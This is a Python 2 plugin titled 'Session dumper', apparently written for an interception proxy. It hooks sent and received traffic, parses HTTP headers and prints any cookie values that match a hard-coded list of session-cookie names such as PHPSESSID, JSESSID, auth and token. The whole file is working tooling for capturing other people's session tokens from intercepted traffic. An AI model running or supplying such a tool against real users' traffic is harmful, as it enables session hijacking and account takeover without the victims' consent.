import __builtin__

from StringIO import StringIO
from httplib import HTTPResponse


class Extender(__builtin__.plugin_hook):

    name = "Session dumper"

    sessioncookies = ["JSESSID", "SESSID", "ASPSESSION", "ASPSESSID",
                      "PHPSESSID", "PHPSESSION", "auth", "c_users",
                      "users", "login", "SESSIONID", "sessid", "jsession",
                      "jauth", "users", "user", "authentication", "token"]

    class FakeSocket(StringIO):
        def makefile(self, *args, **kwargs):
            return self

    def recv(self, forwarder, buffersize, flags=None):
        data = super(Extender, self).recv(forwarder, buffersize, flags)
        if len(data) > 0:
            try:
                response = HTTPResponse(self.FakeSocket(data))
                response.begin()
                for header in response.getheaders():
                    if header[0] in ["set-cookie", "cookie"]:  # maybe started a new session?
                        for cookie in self.sessioncookies:
                            if cookie in header[1]:
                                print "[*] Got session => ", header[1]
            except AttributeError:
                pass  # maybe not response or https
        return data

    def bind(self, address):
        super(Extender, self).bind(address)

    def connect(self, address):
        super(Extender, self).connect(address)

    def sendall(self, forwarder, data, flags=None):
        if len(data) > 0:
            try:
                request = self.HTTPReq(data)
                for header in request.headers:
                    if header == "cookie":  # maybe started a new session?
                        for cookie in self.sessioncookies:
                            if cookie in request.headers.getheader(header):
                                print "[*] Got session => ", request.headers.getheader(header)
            except AttributeError:
                pass  # maybe not response or https
        super(Extender, self).sendall(forwarder, data, flags)
